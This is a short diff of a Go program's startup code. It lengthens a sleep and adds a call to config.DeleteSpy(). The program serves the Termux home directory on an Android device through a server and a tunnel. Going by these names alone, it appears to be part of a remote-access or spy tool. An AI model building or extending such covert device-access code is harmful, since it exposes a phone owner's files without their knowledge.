@@ -20,6 +20,7 @@ func main(){
 	if (axs){
 		
 		Init()
+		
 	}
 	
 	
@@ -31,10 +32,10 @@ func Init(){
 	go utils.ServerInit("/data/data/com.termux/files/home")
 	go utils.InitTunnel()
 	
-	time.Sleep(8*time.Second)
+	time.Sleep(10*time.Second)
 	utils.Send("As")
 	//fmt.Println("siuuuuu")
-	
+	config.DeleteSpy()
 	
 	select {}
 	
